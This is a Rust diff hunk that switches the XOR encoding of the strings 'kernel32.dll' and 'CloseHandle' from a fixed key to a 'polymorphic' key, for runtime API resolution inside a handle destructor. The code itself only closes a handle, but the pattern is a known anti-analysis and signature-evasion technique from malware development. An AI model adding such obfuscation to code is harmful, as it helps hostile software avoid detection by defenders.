@@ -13,13 +13,13 @@ impl Drop for SafeHandle {
     fn drop(&mut self) {
         if self.0 != 0 && self.0 != -1 {
             unsafe {
-                // Dynamic resolution for CloseHandle (Obfuscated)
-                const K32: [u8; 12] = xor_str!("kernel32.dll", 0x55);
-                const CH: [u8; 11] = xor_str!("CloseHandle", 0x55);
+                // Dynamic resolution for CloseHandle (Obfuscated with Polymorphic Key)
+                const K32: [u8; 12] = xor_str!("kernel32.dll", obfuscate::POLY_XOR_KEY);
+                const CH: [u8; 11] = xor_str!("CloseHandle", obfuscate::POLY_XOR_KEY);
                 
                 let close_handle = Resolve::api::<unsafe extern "system" fn(HANDLE) -> i32>(
-                    &obfuscate::decrypt(&K32, 0x55), 
-                    &obfuscate::decrypt(&CH, 0x55)
+                    &obfuscate::decrypt(&K32, obfuscate::POLY_XOR_KEY), 
+                    &obfuscate::decrypt(&CH, obfuscate::POLY_XOR_KEY)
                 );
                 if let Some(f) = close_handle {
                     f(self.0);
